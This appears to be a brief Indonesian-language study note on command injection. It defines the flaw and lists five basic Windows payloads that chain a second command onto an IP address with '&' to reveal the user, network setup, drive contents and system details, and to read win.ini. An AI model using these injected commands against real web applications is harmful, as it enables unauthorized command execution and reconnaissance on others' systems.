# command injection
Command Injection adalah kerentanan yang terjadi ketika aplikasi web meneruskan input pengguna yang tidak divalidasi ke sistem operasi untuk dieksekusi
## payload dasar 
melihat user web server
```bash
192.168.68.169 & whoami 
```
Lihat konfigurasi IP
```bash
192.168.68.169 & ipconfig
```
List isi drive C
```bash
192.168.68.169 & dir C:\
```
Informasi sistem lengkap
```bash
192.168.68.169 & systeminfo
```
Baca file sistem
```bash
192.168.68.169 & type C:\Windows\win.ini
```


